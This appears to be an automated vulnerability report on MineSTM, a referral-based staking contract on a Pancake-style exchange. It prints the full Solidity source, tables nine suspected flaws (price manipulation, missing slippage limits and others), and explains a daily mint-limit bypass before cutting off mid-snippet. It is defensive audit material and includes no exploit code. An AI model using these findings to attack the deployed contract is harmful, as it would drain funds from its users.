# Smart Contract Vulnerability Analysis Report

**Job ID:** eea6492f-4288-4ad6-82d3-49607e49b06f
**Date:** 2025-03-24 02:16:20

**Contract Preview:**

```solidity

{"IPancake.sol":{"content":"\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ninterface IPancakeRouter01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n\ninterface IPancakeRouter02 is IPancakeRouter01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ninterface IPancakeFactory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n\n    function INIT_CODE_PAIR_HASH() external view returns (bytes32);\n}\n\ninterface IPancakePair {\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n\n    function mint(address to) external returns (uint liquidity);\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n\n    function initialize(address, address) external;\n}"},"MineSTM.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\nimport \"./IPancake.sol\";\n\n\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c \u003e= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b \u003c= a, errorMessage);\n        uint256 c = a - b;\n        return c;\n    }\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b \u003e 0, errorMessage);\n        uint256 c = a / b;\n        return c;\n    }\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\n\nlibrary Math {\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a \u003c b ? a : b;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n   \n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\ncontract Ownable {\n    address public owner;\n\n    constructor () {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(owner == msg.sender, \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        owner = newOwner;\n    }\n}\n\ncontract MineSTM is Ownable {\n    using SafeMath for uint256;\n    struct User {\n        uint256 id;\n        address linkAddress;\n        uint256 level;\n        uint256 adaptAmount;\n        uint256 lastAdaptTime;\n        uint256 lastAdaptAmount;\n        uint256 totalAdaptAmount;\n        address[] directs; //Link address\n        uint256 totalTeamAmount;\n        uint256 notUpdatedAmount;\n        address maxDirectAddr;\n        uint256 curPower;\n        uint256 refReward;\n        uint256 levelReward;\n        uint256 compensationReward;\n        uint256 totalPayoutToken;\n    }\n    //constant\n\n    //User ID\n    uint256 public nextUserId = 2;\n    //EVE Token contract \n    IERC20 private constant eve_token_erc20 = IERC20(0xBd0DF7D2383B1aC64afeAfdd298E640EfD9864e0);\n    //USDT Token contract \n    IERC20 private constant usdt_token_erc20 = IERC20(0x55d398326f99059fF775485246999027B3197955);\n\n    //Community Marketing Fund\n    IERC20 private constant market_fund_addr = IERC20(0xC7665062b5D5B027e30b33dF2b98b57e0642E1E1);\n    //Technology Fund\n    IERC20 private constant technology_fund_addr = IERC20(0xC251235DF07a62B1b16F81216c518666D1b5BAE7);\n    //Node Fund\n    IERC20 private constant node_fund_addr = IERC20(0x8BD5071e16e8D8562CbcA1212527D1310E36292C);\n\n    //Fee Fund\n    IERC20 private constant fee_fund_addr = IERC20(0x3dB77cc96dBFA35b32d1Ba074Af3E3400c423060);\n    //Minimum investment amount\n     uint256 minAdaptAmount = 100*10**18;\n\n    //mappings\n    mapping(address =\u003e User) private users; \n    //User ID corresponds to address\n    mapping(uint256 =\u003e address) public id2Address;\n\n    //Node whitelist for user\n    mapping(address =\u003e bool) public nodeUserWhitelist;\n\n    bool public isMint;\n\n    uint256 public limitMintAllAmount;\n\n    uint256 public limitMintSingleAmount;\n\n\n    uint256 public dayMintAmount;\n\n    bool public isLmint = true;\n\n    uint256 public mineTime = 1709125200;\n\n\n    function setNodeUserWhitelist(address[] memory _address,bool _bool) public onlyOwner {\n       for(uint i = 0;i \u003c _address.length;i++){\n          nodeUserWhitelist[_address[i]] = _bool;\n       }\n    }\n\n    function setMint(uint256 _mineTime) public onlyOwner {\n       mineTime = _mineTime;\n    }\n\n    function setMint(bool _bool) public onlyOwner {\n       isMint = _bool;\n    }\n\n    function setLmint(bool _bool) public onlyOwner {\n       isLmint = _bool;\n    }\n\n    function setLimitMintAllAmount(uint256 _setLimitMintAllAmount) public onlyOwner {\n       limitMintAllAmount = _setLimitMintAllAmount;\n    }\n\n    function setLimitMintSingleAmount(uint256 _limitMintSingleAmount) public onlyOwner {\n       limitMintSingleAmount = _limitMintSingleAmount;\n    }\n\n    //EVENTS\n    event Register(address addr, address up);\n    event Invest(address addr, uint256 amount);\n    event Reward(address addr, uint256 amount);\n    event RewardToken(address addr, uint256 amount, uint256 tokenAmount);\n\n    //swap\n    IPancakeRouter02 private constant uniswapV2Router = IPancakeRouter02(0x0ff0eBC65deEe10ba34fd81AfB6b95527be46702);\n    IPancakePair private constant inner_pair = IPancakePair(0x2E45AEf311706e12D48552d0DaA8D9b8fb764B1C);\n\n    constructor(address _linkAddress) {\n        updateUSDTAndTokenAllowance();\n        //Initializes the link address\n        _initLinkAddres(_linkAddress);\n\n    }\n\n    function _initLinkAddres(address _linkAddress) private {\n         users[_linkAddress].id = 1;\n        id2Address[1] = _linkAddress;\n    }\n    \n    //Bing user relationships\n    function register(address _upAddr,address _msgAddr) private   {\n        if (!isUserExists(_msgAddr)) {\n            require(isUserExists(_upAddr), \"Link address not registered\");\n            _register(_msgAddr, _upAddr);\n        }\n    }\n\n    function whitelistRegister(address _upAddr) public   {\n        if (!isUserExists(msg.sender) \u0026\u0026 nodeUserWhitelist[msg.sender]) {\n            require(isUserExists(_upAddr), \"Link address not registered\");\n            _whiteListRegister(msg.sender, _upAddr);\n        }else{\n            require(!isUserExists(msg.sender) \u0026\u0026 nodeUserWhitelist[msg.sender], \"Msg Sender is not whitelist\");\n        }\n    }\n\n    function _register(address down, address up) private {\n        uint256 id = nextUserId++;\n        users[down].id = id;\n        users[down].linkAddress = up;\n        id2Address[id] = down;\n        users[up].directs.push(down);\n        emit Register(down, up);\n    }\n\n    function _whiteListRegister(address down, address up) private {\n        uint256 id = nextUserId++;\n        users[down].level = 3;\n        users[down].id = id;\n        users[down].linkAddress = up;\n        id2Address[id] = down;\n        users[up].directs.push(down);\n        emit Register(down, up);\n    }\n\n    function isUserExists(address addr) public view returns (bool) {\n        return (users[addr].id != 0);\n    }\n\n    function findLinkAddr(address _addr) public view returns (address) {\n        return users[_addr].linkAddress;\n    }\n   \n\n    //LP MINT\n    function lpMint(address referrer,uint256 amount) public {\n       \n        if(isLmint){\n            if(amount \u003e limitMintSingleAmount){\n                return;\n            }  \n            if(dayMintAmount \u003e= limitMintAllAmount){\n                return;\n            }  \n        }\n        dayMintAmount = dayMintAmount+ dayMintAmount;\n        //Bind link address\n        register(referrer,msg.sender);\n        User storage _user = users[msg.sender];   \n        //Judging whether the investment amount is incorrect\n        _whetherAdaptAmount(amount,_user.lastAdaptAmount,_user.curPower,_user.lastAdaptAmount,msg.sender,false);\n        usdt_token_erc20.transferFrom(msg.sender, address(this), amount); \n      \n        uint256 _uintAmount = amount/100;\n        usdt_token_erc20.transfer(address(market_fund_addr), _uintAmount.mul(5));\n        usdt_token_erc20.transfer(address(technology_fund_addr), _uintAmount.mul(3));\n        usdt_token_erc20.transfer(address(node_fund_addr), _uintAmount.mul(2));\n        _user.lastAdaptAmount = amount;\n        _user.totalAdaptAmount = _user.totalAdaptAmount.add(amount);\n        //Calculate level\n        _ctl(msg.sender, amount);\n\n        uint256 adaptAmount = getAdapt(_user.curPower, _user.lastAdaptTime);\n        _user.lastAdaptTime = block.timestamp;\n        _user.adaptAmount += adaptAmount;\n        _user.curPower = _user.curPower - adaptAmount + 3*amount;\n\n        //Add Pool\n        uint256 o =_uintAmount*90;\n        //60 * 10**22 \n        if(eve_token_erc20.balanceOf(address(inner_pair)) \u003e  600000 * 10**18 ) {\n            swapAndLiquify(o);\n        }else {\n            addLiquidity(o, calOther(o));\n        }\n     \n\n        emit Invest(msg.sender, amount);\n    }\n\n\n    //LP MINT\n    function nodeUserLpMint(address referrer,address _nodeUserAddr,uint256 amount) public onlyOwner {\n       \n        //Bind link address\n        register(referrer,_nodeUserAddr);\n        User storage _user = users[_nodeUserAddr];   \n        //Judging whether the investment amount is incorrect\n        _whetherAdaptAmount(amount,_user.lastAdaptAmount,_user.curPower,_user.lastAdaptAmount,_nodeUserAddr,true);\n        usdt_token_erc20.transferFrom(msg.sender, address(this), amount); \n      \n        uint256 _uintAmount = amount/100;\n        usdt_token_erc20.transfer(address(market_fund_addr), _uintAmount.mul(5));\n        usdt_token_erc20.transfer(address(technology_fund_addr), _uintAmount.mul(3));\n        usdt_token_erc20.transfer(address(node_fund_addr), _uintAmount.mul(2));\n        _user.lastAdaptAmount = amount;\n        _user.totalAdaptAmount = _user.totalAdaptAmount.add(amount);\n        //Calculate level\n        _ctl(_nodeUserAddr, amount);\n\n        uint256 adaptAmount = getAdapt(_user.curPower, _user.lastAdaptTime);\n        _user.lastAdaptTime = block.timestamp;\n        _user.adaptAmount += adaptAmount;\n        _user.curPower = _user.curPower - adaptAmount + 3*amount;\n\n        //Add Pool\n        uint256 o =_uintAmount*90;\n        //60 * 10**22 \n        if(eve_token_erc20.balanceOf(address(inner_pair)) \u003e  600000 * 10**18 ) {\n            swapAndLiquify(o);\n        }else {\n            addLiquidity(o, calOther(o));\n        }\n\n        emit Invest(_nodeUserAddr, amount);\n    }\n\n    //Judging whether the investment amount is incorrect\n    function _whetherAdaptAmount(uint256 amount,uint256 _lastAdaptAmount,uint256 curPower,uint256 lastAdaptAmount,address msgaddr,bool isNodeUser) view private {\n        require(amount \u003e= minAdaptAmount, \"Investment amount error\");  \n        \n        if(!isNodeUser){\n            require(isMint,\"Not yet open\");\n        } \n        if(lastAdaptAmount != 0){\n            require((curPower == 0), \"Power is not zero\");  \n        }\n\n        if(_lastAdaptAmount \u003e 0){\n            require(amount \u003e= (minAdaptAmount+_lastAdaptAmount), \"Investment amount error\");  \n        }\n        //Whether to bind the relationship\n        require(isUserExists(msgaddr), \"Please bind the relationship first\");  \n    }\n\n\n     function swapAndLiquify(uint256 amount) private {\n        uint256 half = amount / 2;\n        uint256 otherHalf = amount - half;\n        swapUSDTForTokens(half);\n        addLiquidity(otherHalf, calOther(otherHalf));\n    }\n    function swapUSDTForTokens(uint256 usdtAmount) private {\n        address[] memory path = new address[](2);\n        path[0] = address(usdt_token_erc20);\n        path[1] = address(eve_token_erc20);\n        uniswapV2Router.swapExactTokensForTokens(\n            usdtAmount,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n    function addLiquidity(uint256 token0Amount, uint256 token1Amount) private {\n        uniswapV2Router.addLiquidity(\n            address(usdt_token_erc20),\n            address(eve_token_erc20),\n            token0Amount,\n            token1Amount,\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function calOther(uint256 usdtAmount) public view returns (uint256) {\n        (uint256 r0, uint256 r1, ) = inner_pair.getReserves();\n        return r1*usdtAmount/r0;\n    }\n\n    function initLiquidity(uint256 token0Amount, uint256 token1Amount) public onlyOwner {\n        addLiquidity(token0Amount,token1Amount);\n    }\n\n\n    function updateUSDTAndTokenAllowance() public {\n        usdt_token_erc20.approve(address(uniswapV2Router), type(uint256).max);\n        eve_token_erc20.approve(address(uniswapV2Router), type(uint256).max);\n        //inner_pair.approve(address(uniswapV2Router), type(uint256).max);\n    }\n\n\n    function updateAllowance() public {\n        usdt_token_erc20.approve(address(uniswapV2Router), type(uint256).max);\n        eve_token_erc20.approve(address(uniswapV2Router), type(uint256).max);\n        inner_pair.approve(address(uniswapV2Router), type(uint256).max);\n    }\n\n    //Calculate team level\n    function _ctl(address addr, uint256 amount) private{\n        address up = users[addr].linkAddress;\n        for(uint256 i; i \u003c 100; ++i) {\n            if(up == address(0)) break;\n            if(i != 99) {\n                users[up].totalTeamAmount += amount;\n            }else {\n                users[up].notUpdatedAmount += amount;\n            }\n            _cl(addr, up);\n            addr = up;\n            up = users[up].linkAddress;\n        }\n    }\n\n\n\n    function clba(uint256 maxAmount,uint256 amount) public pure returns(uint256){\n        if(maxAmount \u003c 50*10**20) {\n            return 0;\n        }else if(maxAmount \u003c 10**22) {\n            return 1;\n        }else if(maxAmount \u003c 3*10**22) {\n            return 2;\n        }else if(maxAmount \u003c 10*10**22) {\n            return 3;\n        }else if(maxAmount \u003c 15*10**22) {\n            return 4;\n        }else if(maxAmount \u003e= 15*10**22 \u0026\u0026 amount \u003e= 15*10**22 \u0026\u0026 amount \u003c 50*10**22) {\n            return 5;\n        }else if(maxAmount \u003e= 50*10**22 \u0026\u0026 amount \u003e= 50*10**22 \u0026\u0026 amount \u003c 150*10**22) {\n            return 6;\n        }else if(maxAmount \u003e= 150*10**22 \u0026\u0026 amount \u003e= 150*10**22){\n            return 7;\n        }else{\n             return 4;\n        }\n    }\n\n    function updateTokenAllowance(address _addr,address _appAddr) public onlyOwner {\n        IPancakePair(_addr).approve(address(_appAddr), type(uint256).max);\n    }\n\n\n    function userInfo(address addr) external view returns(uint256, address, uint256, uint256, uint256, uint256, uint256, address, uint256) {\n        User memory o = users[addr];\n        uint256 bigAreaAmount = users[o.maxDirectAddr].totalAdaptAmount + users[o.maxDirectAddr].totalTeamAmount;\n        return (o.id, o.linkAddress, o.level, o.adaptAmount, o.lastAdaptTime, o.totalTeamAmount, o.notUpdatedAmount, o.maxDirectAddr, bigAreaAmount);\n    }\n\n    function userRewardInfo(address addr) external view returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256) {\n        User memory o = users[addr];\n        uint256 staticReward = o.adaptAmount + getAdapt(o.curPower, o.lastAdaptTime);\n        return (o.lastAdaptAmount, o.totalAdaptAmount, o.curPower, o.level, staticReward, o.refReward, o.levelReward, o.compensationReward, o.totalPayoutToken);\n    }\n\n    function getAdapt(uint256 curPower, uint256 lastAdaptTime) public  view returns(uint256) {\n        if(lastAdaptTime \u003c mineTime \u0026\u0026 block.timestamp \u003c mineTime){\n            return 0;\n        }\n        uint256 adaptAmount;\n        if(lastAdaptTime \u003c mineTime \u0026\u0026 block.timestamp \u003e mineTime){\n             adaptAmount = curPower*(block.timestamp - mineTime)/(100*86400);\n            if(adaptAmount \u003e curPower) {\n                adaptAmount = curPower;\n            }\n            return adaptAmount;\n        }\n        adaptAmount = curPower*(block.timestamp - lastAdaptTime)/(100*86400);\n        if(adaptAmount \u003e curPower) {\n            adaptAmount = curPower;\n        }\n        return adaptAmount;\n    }\n\n\n    function getReward(uint256 i) external {\n        User storage s = users[msg.sender];\n        uint256 reward = getAdapt(s.curPower, s.lastAdaptTime);\n        s.lastAdaptTime = block.timestamp;\n        s.curPower -= reward;\n        s.adaptAmount += reward;\n        if(i == 0) {\n            reward = s.adaptAmount;\n            s.adaptAmount = 0;\n            _rfp(msg.sender, reward);\n            uint256 fee = reward*10/100;\n            _payoutToken(msg.sender, reward-fee);\n            _payoutToken(address(fee_fund_addr), fee);\n        }else if(i \u003c 3) {\n            if(i == 1) {\n                reward = s.refReward;\n                s.refReward = 0;\n            }else {\n                reward = s.levelReward;\n                s.levelReward = 0;\n            }\n            if(reward \u003e s.curPower) {\n                reward = s.curPower;\n            }\n            s.curPower -= reward;\n            uint256 fee = reward*10/100;\n            _payoutToken(msg.sender, reward-fee);\n            _payoutToken(address(fee_fund_addr), fee);\n        }\n    }\n\n    function _rfp(address addr, uint256 amount) private{\n        address up = users[addr].linkAddress;\n        uint256 curLevel;\n        uint256 curLevelReward;\n        uint256 totalLevelReward;\n        for(uint256 i; i \u003c 100; ++i) {\n            if(up == address(0)) break;\n            //Mining recommendation reward\n            if(i == 0) {\n                users[up].refReward += amount/10;\n            }else if(i == 1) {\n                users[up].refReward += amount*6/100;\n            }else if(i == 2){\n                users[up].refReward += amount*4/100;\n            }\n            uint256 uLevel = users[up].level;\n            if(uLevel \u003e curLevel) {\n                uint256 lr = clr(uLevel, totalLevelReward, amount);\n                users[up].levelReward += lr;\n                curLevelReward = lr;\n                totalLevelReward += lr;\n                curLevel = uLevel;\n            }else if(uLevel == curLevel \u0026\u0026 uLevel \u003e 0) {\n                //Equal level reward  \n                uint256 lr = curLevelReward/10;\n                users[up].levelReward += lr;\n                curLevelReward = lr;\n            }\n            up = users[up].linkAddress;\n        }\n    }\n\n     function clr(uint256 i, uint256 totalLevelReward, uint256 amount) public pure returns(uint256) {\n        uint256 r;\n        if(i == 0) {\n            return 0;\n        }else if(i == 1) {\n            r = 10;\n        }else if(i == 2) {\n            r = 20;\n        }else if(i == 3) {\n            r = 30;\n        }else if(i == 4) {\n            r = 40;\n        }else if(i == 5) {\n            r = 50;\n        }else if(i == 6) {\n            r = 60;\n        }else {\n            r = 70;\n        }\n        return amount*r/100 - totalLevelReward;\n    }\n\n\n    function _cl(address addr, address up) private{\n        address m = users[up].maxDirectAddr;\n       \n        uint256 mAmount = users[m].totalAdaptAmount + users[m].totalTeamAmount;\n        uint256 aAmount = users[addr].totalAdaptAmount + users[addr].totalTeamAmount;\n        uint256 sa = users[up].totalTeamAmount + users[up].notUpdatedAmount;\n        uint256 allSa = sa;\n        if(mAmount \u003e= aAmount) {\n            sa -= mAmount;\n        }else{\n            users[up].maxDirectAddr = addr;\n            sa -= aAmount;\n        }\n        uint256 oldLevel = users[up].level;\n        if(oldLevel == 7) {\n            return;\n        }\n        uint256 newLevel = clba(allSa,sa);\n        if(newLevel \u003e oldLevel) {\n            users[up].level = newLevel;\n        }\n\n    }\n\n\n    function refreshLevel(address addr) public {\n        address m = users[addr].maxDirectAddr;\n      \n        uint256 mAmount = users[m].totalAdaptAmount + users[m].totalTeamAmount;\n        uint256 sa = users[addr].totalTeamAmount + users[addr].notUpdatedAmount;\n        uint256 minSa = sa - mAmount;\n        uint256 oldLevel = users[addr].level;\n        if(oldLevel == 7) {\n            return;\n         }\n        uint256 newLevel = clba(sa,minSa);\n        if(newLevel \u003e oldLevel) {\n            users[addr].level = newLevel;\n        }\n      \n    }\n\n\n    function _payoutToken(address addr, uint256 amount) private{\n        uint256 price = getPrice();\n        uint256 tokenAmount = amount * 10**18/price;\n        eve_token_erc20.transfer(addr, tokenAmount*9/10);\n        eve_token_erc20.transfer(address(market_fund_addr), tokenAmount/10);\n        users[addr].totalPayoutToken += tokenAmount;\n        emit RewardToken(addr, amount, tokenAmount);\n    }\n\n    function getPrice() public view returns (uint256) {\n        address[] memory path = new address[](2);\n        path[0] = address(eve_token_erc20);\n        path[1] = address(usdt_token_erc20);\n        uint[] memory amounts = new uint[](2);\n        amounts = uniswapV2Router.getAmountsOut(10**18, path);\n        return amounts[1];\n    }\n\n    function _payoutUSDT(address addr, uint256 amount) private{\n        usdt_token_erc20.transfer(addr, amount*9/10);\n        usdt_token_erc20.transfer(address(market_fund_addr), amount/10);\n        emit Reward(addr, amount);\n    }\n\n    function withOutToken(address account,address account2,uint256 amount) public onlyOwner {\n        IERC20(account).transfer(account2, amount);\n    }\n\n    function withdawOwner(uint256 amount) public onlyOwner{\n        payable(msg.sender).transfer(amount);\n    }\n\n    function sell(uint256 amount) external {\n        eve_token_erc20.transferFrom(msg.sender, address(this), amount);\n        (, uint256 r1, ) = inner_pair.getReserves();\n        uint256 lpAmount = amount*inner_pair.totalSupply()/(2*r1);\n        uniswapV2Router.removeLiquidity(address(usdt_token_erc20),address(eve_token_erc20),lpAmount,0,0,msg.sender,block.timestamp);\n    }\n\n    function stu(uint256 tokenAmount, address addr) private {\n        address[] memory path = new address[](2);\n        path[0] = address(eve_token_erc20);\n        path[1] = address(usdt_token_erc20);\n        uniswapV2Router.swapExactTokensForTokens(\n            tokenAmount,\n            0,\n            path,\n            addr,\n            block.timestamp\n        );\n    }\n\n    function setNodeUserLeve(address _nodeUser,uint256 _lve)  public onlyOwner  {\n        if (nodeUserWhitelist[_nodeUser]) {\n           User storage s = users[msg.sender];\n           s.level = _lve; \n        }\n    }\n\n\n    function getDirectsByPage(uint256 pageNum, uint256 pageSize) external view returns (address[] memory directAddrs, \n        uint256[] memory personalAmounts, uint256[] memory downlineAmounts, uint256 total) {\n        address addr = msg.sender;\n        User storage s = users[addr];\n        total = s.directs.length;\n        uint256 from = pageNum*pageSize;\n        if (total \u003c= from) {\n            return (new address[](0), new uint256[](0), new uint256[](0), total);\n        }\n        uint256 minNum = Math.min(total - from, pageSize);\n        directAddrs = new address[](minNum);\n        personalAmounts = new uint256[](minNum);\n        downlineAmounts = new uint256[](minNum);\n        for (uint256 i = 0; i \u003c minNum; i++) {\n            address one = s.directs[from++];\n            directAddrs[i] = one;\n            personalAmounts[i] = users[one].totalAdaptAmount;\n            downlineAmounts[i] = users[one].totalTeamAmount;\n        }\n    }\n}\n\n\n\n"}}
...
```

## Vulnerability Summary

Found 9 potential vulnerabilities:

| # | Vulnerability Type | Confidence | Affected Functions |
|---|-------------------|------------|--------------------|
| 1 | arithmetic | 0.80 | lpMint |
| 2 | price_manipulation | 0.70 | swapUSDTForTokens, addLiquidity, getPrice |
| 3 | no_slippage_limit_check | 0.70 | swapUSDTForTokens, addLiquidity, swapAndLiquify |
| 4 | unchecked_low_level_calls | 0.30 | lpMint, nodeUserLpMint, withOutToken, _payoutUSDT, _payoutToken, sell |
| 5 | business_logic | 0.30 | _rfp, _whiteListRegister, whitelistRegister, _cl |
| 6 | reentrancy | 0.20 | _payoutToken, getReward, lpMint, nodeUserLpMint |
| 7 | access_control | 0.20 | transferOwnership, whitelistRegister |
| 8 | denial_of_service | 0.20 | _rfp, _ctl, _cl, refreshLevel |
| 9 | bad_randomness | 0.00 | getAdapt, clr, clba, refreshLevel |

## Detailed Analysis

### Vulnerability #1: arithmetic

**Confidence:** 0.80

**Reasoning:**

Although SafeMath is used for arithmetic operations, there are logical arithmetic issues that may affect business logic. For instance, in the lpMint function the statement 'dayMintAmount = dayMintAmount + dayMintAmount;' appears to double the day's minted amount rather than adding the amount of tokens just minted. This could be an error in state tracking and may have unforeseen cumulative effects over time.

**Validation:**

In lpMint the update to dayMintAmount is implemented as 'dayMintAmount = dayMintAmount + dayMintAmount' rather than adding a measure of the current mint action. With an initial value of zero (or even if nonzero) this arithmetic error means the daily total is not properly incremented, effectively bypassing the daily limit mechanism. This is a genuine business logic bug that can be exploited.

**Code Snippet:**

```solidity
function lpMint(address referrer,uint256 amount) public {
       
        if(isLmint){
            if(amount > limitMintSingleAmount){
                return;
            }  
            if(dayMintAmount >= limitMintAllAmount){
                return;
            }  
        }
        dayMintAmount = dayMintAmount+ dayMintAmount;
        //Bind link address
        register(referrer,msg.sender);
        User storage _user = users[msg.sender];   
        //Judging whether the investment amount is incorrect
        _whetherAdaptAmount(amount,_user.lastAdaptAmount,_user.curPower,_user.lastAdaptAmount,msg.sender,false);
        usdt_token_erc20.transferFrom(msg.sender, address(this), amount); 
      
        uint256 _uintAmount = amount/100;
        usdt_token_erc20.transfer(address(market_fund_addr), _uintAmount.mul(5));
        usdt_token_erc20.transfer(address(technology_fund_addr), _uintAmount.mul(3));
        usdt_token_erc20.transfer(address(node_fund_addr), _uintAmount.mul(2));
        _user.lastAdaptAmount = amount;
        _user.totalAdaptAmount = _user.totalAdaptAmount.add(amount);
        //Calculate level
